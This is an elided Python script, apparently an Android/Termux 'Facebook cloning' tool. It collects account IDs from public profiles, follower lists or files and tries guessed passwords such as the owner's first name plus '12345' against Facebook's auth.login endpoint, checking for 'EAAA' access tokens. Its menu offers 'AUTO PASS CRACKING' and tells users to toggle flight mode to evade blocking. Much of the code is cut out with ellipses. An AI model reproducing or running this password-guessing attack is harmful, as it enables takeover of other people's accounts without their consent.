...
def main():
	...
	print("\033[96;1m  [J] SUBSCRIBE MY CHANNEL \033[92;1m☜\033[91;1m☜")
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://youtu.be/TVWwiog-kU0"])
		main()
...
def menu():
    ...
    try:
        ...
        logo()
        print("")
        print("\033[91;1m    TOKEN HAS BEEN EXPIRED")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        main()
    ...
    print("")
    print("\033[92;1m  [1] AUTO PASS CRACKING")
    print("\033[93;1m  [2] CHOOSE PASS CRACKING")
...
def crack1():
	...
	print("")
	print("\033[94;1m  [1] PUBLIC ID CRACKING")
	print("\033[93;1m  [2] FOLLOWERS CRACKING")
	print("\033[92;1m  [3] FILE CRACKING")
	print("")
	crack_select1()
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		print("\t\033[92;1m UNLIMITED PUBLIC ID CLONING ")
		print("")
		try:
		...
		logo()
		print("")
		print("      \033[92;1mUNLIMITED FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
	...
	print("\033[92;1m  CLONING HAS BEEN START\x1b[0m")
	print("\033[94;1m  TURN ON/OFF FLIGHT MODE IF NO RESULT \033[92;1m☜\033[91;1m☜\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
						...
						if "www.facebook.com" in data.json()['error_msg']:
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									pass4 = name.lower().split(' ')[1] + '12345'
									api = 'https://b-api.facebook.com/method/auth.login'
	...
	linex()
	print("")
	print("\033[92;1m CLONING COMPLETE")
...
def crack():
	...
	logo()
	print("")
	print("\t\033[93;1m  CHOICE PASS CRACKING")
	print("")
	print("\033[94;1m  [1] PUBLIC ID CRACKING")
	print("\033[93;1m  [2] FOLLOWERS CRACKING")
	print("\033[92;1m  [3] FILE CRACKING")
...
def crack_select():
	...
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  CLONING START\x1b[0m")
	print("\033[94;1m  TURN ON/OFF FLIGHT MODE IF NO RESULT \033[92;1m☜\033[91;1m☜\x1b[0m")
	linex()
	def main(arg):
		user=arg
